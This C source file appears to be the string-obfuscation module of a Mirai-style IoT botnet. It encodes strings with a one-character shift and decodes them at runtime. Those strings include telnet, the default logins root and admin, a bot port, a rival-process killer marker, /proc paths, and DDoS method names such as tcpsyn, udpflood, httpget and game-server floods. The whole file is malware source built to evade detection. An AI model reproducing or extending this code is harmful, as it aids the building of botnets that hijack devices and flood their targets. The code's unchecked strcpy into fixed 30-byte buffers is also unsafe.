#define _GNU_SOURCE
#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <time.h>
#include <string.h>

#include "headers/encryption.h"

char dec_buf[512];
char estring[30];
char dstring[30];
int l = 0, g = 0;
int CurrentArrayNumber;

void encrypt_array() {
	add_combo("ufmofu");			// telnet				
	add_combo("ozb"); 				// nya
	add_combo("{is"); 				// zhr
	add_combo("sppu");				// root
	add_combo("benjo");				// admin
	add_combo("555");				// bot port = 444
	add_combo("ljmmzpvstfmg");		// killyourself
	add_combo("0qspd0");			// /proc/			
	add_combo("0nbqt");				// /maps			
	add_combo("0dnemjof");			// /cmdline			
	add_combo("0tubuvt");			// /status			
	add_combo("0fyf");				// /exe  			
	add_combo("udq");
	add_combo("udqtzo");
	add_combo("udqqti");
	add_combo("udqbdl");
	add_combo("udqbmm");
	add_combo("veqqmbjo");
	add_combo("veqify");
	add_combo("veqsboe");
	add_combo("veqhbnf");
	add_combo("veqwtf");
	add_combo("jdnqfdip");
	add_combo("iuuqhfu");
	add_combo("iuuqqptu");
	add_combo("iuuqovmm");
	add_combo("iuuqqvu");
	add_combo("iuuqqbudi");
	add_combo("njofdsbgu");
	add_combo("ufssbsjb");
	add_combo("bjsespqqjohDmpvet"); // airdroppingClouds
	add_combo("dmpveqspdftt");	// cloudprocess
	

#ifdef DEBUG
	printf("[DECRYPT] added %d combos to combo table\n", CurrentArrayNumber);
#endif
}

void encrypt_by_name(char *str) {
	strcpy(estring, str);
#ifdef TABLE_DEBUG
	printf("[ENCRYPT] encrypting '%s'\n", estring);
#endif
	int i;
	for(i = 0; i < strlen(estring); i++) {
		estring[i] = estring[i] + TABLE_KEY; 
	}
#ifdef TABLE_DEBUG
 	printf("[ENCRYPT] encrypted '%s'\n", estring);
#endif
}


void decrypt_by_name(char *str) {
	int i;
	strcpy(dstring, str);
#ifdef TABLE_DEBUG
	printf("[DECRYPT] decrypting '%s'\n", dstring);
#endif


	for(i = 0; i < strlen(dstring); i++){
		dstring[i] = dstring[i] - TABLE_KEY; 

	}
#ifdef TABLE_DEBUG
	 printf("[DECRYPT] decrypted '%s'\n", dstring);
#endif

	 strcpy(encrypter[g].decrypt, dstring);
#ifdef DEBUG
	printf("[DECRYPT] adding decrypted string '%s' to array [%d]\n", encrypter[g].decrypt, g);
#endif
	g++;
}



void add_combo(char *str) {	
	strcpy(encrypter[l].combo, str);
#ifdef TABLE_DEBUG
		printf("[ENCRYPT] adding encrypted string '%s' to array\n", encrypter[l].combo);
#endif	
		decrypt_by_name(encrypter[l].combo);
		CurrentArrayNumber++;
		l++;	
}


void decrypt_for_recv(char *str) {
	int i;
	strcpy(dstring, str);
#ifdef TABLE_DEBUG
		printf("[DECRYPT] decrypting '%s'\n", dstring);
#endif


	for(i = 0; i < strlen(dstring); i++){
		dstring[i] = dstring[i] - TABLE_KEY; 

	}
#ifdef TABLE_DEBUG
	 printf("[DECRYPT] decrypted '%s'\n", dstring);
#endif

	 strcpy(dec_buf, dstring);

}
